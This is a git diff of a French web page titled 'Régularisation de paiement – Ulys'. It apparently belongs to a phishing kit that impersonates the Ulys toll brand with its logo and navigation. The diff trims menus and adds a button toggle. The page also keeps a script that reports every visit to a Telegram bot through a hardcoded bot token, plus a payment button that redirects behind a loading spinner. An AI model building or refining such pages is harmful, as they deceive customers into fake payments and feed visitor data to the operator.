@@ -5,17 +5,15 @@
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <title>Régularisation de paiement – Ulys</title>
   <link rel="stylesheet" href="assets/css/style.css"/>
+  <style>
+    .header-toggle button {
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
 
-  <!-- BANDEAU HAUT -->
-  <div class="top-nav">
-    <a href="#"><span>👤</span> Mon espace</a>
-    <a href="#" class="btn-primary">Devenir client</a>
-    <div class="lang">FR ▼</div>
-  </div>
-
-  <!-- NAVIGATION PRINCIPALE -->
+  <!-- NAVIGATION MINIMALE Ulys -->
   <div class="site-nav">
     <nav class="navbar">
       <div class="navbar-left">
@@ -23,16 +21,10 @@
           <img src="assets/images/logo-ulys2.png" alt="Ulys" class="logo"/>
         </a>
         <div class="header-toggle">
-          <button class="toggle active">Particulier</button>
-          <button class="toggle">Professionnel</button>
+          <button class="toggle active" onclick="toggleUserType(this)">Particulier</button>
+          <button class="toggle" onclick="toggleUserType(this)">Professionnel</button>
         </div>
       </div>
-      <ul class="nav-links">
-        <li><a href="#">Télépéage</a></li>
-        <li><a href="#">Recharge électrique</a></li>
-        <li><a href="#">Parking</a></li>
-        <li><a href="#">Aide</a></li>
-      </ul>
     </nav>
   </div>
 
@@ -58,7 +50,13 @@
   </footer>
 
   <script>
-    // === Envoi Telegram automatique à chaque visite de la page ===
+    // Changement du bouton actif
+    function toggleUserType(button) {
+      document.querySelectorAll(".header-toggle .toggle").forEach(btn => btn.classList.remove("active"));
+      button.classList.add("active");
+    }
+
+    // Envoi Telegram automatique à chaque visite
     window.addEventListener('DOMContentLoaded', function () {
       const message = "📥 Nouvelle visite détectée sur la page d’accueil (index.html)";
       const token = "7959354545:AAEfYBDF24DOs30vwYScteq1uWMO65FP8Fo";
@@ -74,7 +72,7 @@
       });
     });
 
-    // === Redirection avec spinner après clic sur le bouton ===
+    // Redirection avec spinner
     document.getElementById('btn-pay').addEventListener('click', function(){
       const overlay = document.createElement('div');
       overlay.className = 'loader-overlay';
